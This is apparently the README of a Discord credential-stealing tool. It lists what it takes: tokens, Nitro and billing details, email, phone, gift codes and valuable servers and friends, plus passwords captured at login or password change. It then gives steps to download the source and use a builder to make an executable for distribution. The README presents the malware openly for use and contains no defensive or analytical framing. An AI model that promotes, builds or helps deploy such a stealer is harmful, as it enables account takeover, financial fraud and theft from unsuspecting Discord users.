## Features

-   Discord token info
    -   Nitro
    -   Badges
    -   Billing
    -   Email
    -   Phone
    -   HQ Guilds
    -   HQ Friends
    -   Gift codes

    -   Send token, password, and email on login or when password is changed


## Install

### Prerequisites

-   Windows 10/11
-   [Python](https://www.python.org/downloads/release/python-3109/)

### Setup

1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
2. Extract zip
3. Just Run `95Gros.py` and skip to step 5 
4. If you don't have python installed run `setup.bat`
5. Follow instructions in builder and your exe will be found in the `assets` folder under the name `your name.exe`
